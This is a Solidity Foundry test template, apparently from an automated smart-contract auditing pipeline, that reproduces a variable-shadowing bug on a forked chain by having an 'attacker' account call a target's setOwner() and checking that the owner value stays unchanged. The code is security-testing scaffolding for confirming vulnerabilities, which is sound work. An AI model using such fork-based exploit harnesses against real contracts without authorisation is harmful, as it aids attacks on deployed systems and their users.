// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Variable shadowing (write lands in the wrong var)
/// @notice Detector: shadowing. A function parameter / local / derived
///         variable SHADOWS a state variable, so a write the caller thinks
///         updates the state variable actually updates the shadow -- and
///         every other function keeps reading the ORIGINAL, unchanged value.
///         State diverges: the setter "succeeds" but nothing changes.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt setOwner() / owner() to the
///      target's real shadowed setter / getter.

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        (bool ownerOk, bytes memory beforeRet) =
            target.staticcall(abi.encodeWithSignature("owner()"));
        require(ownerOk, "target has no owner() view -- adapt the getter");
        address ownerBefore = abi.decode(beforeRet, (address));

        // TODO: adapt to the target's real shadowed setter.
        vm.prank(attackerEOA);
        (bool setOk,) = target.call(
            abi.encodeWithSignature("setOwner(address)", attackerEOA)
        );
        require(setOk, "setter call failed -- adapt to the target's setter");

        (bool ownerOk2, bytes memory afterRet) =
            target.staticcall(abi.encodeWithSignature("owner()"));
        address ownerAfter = abi.decode(afterRet, (address));
        console.log("owner before setter:", ownerBefore);
        console.log("owner after setter:", ownerAfter);
        // Setter "succeeded" but the state variable never moved -- the
        // write landed in the shadow.
        assertEq(ownerAfter, ownerBefore, "exploit did not reproduce: setter actually updated state");
    }
}
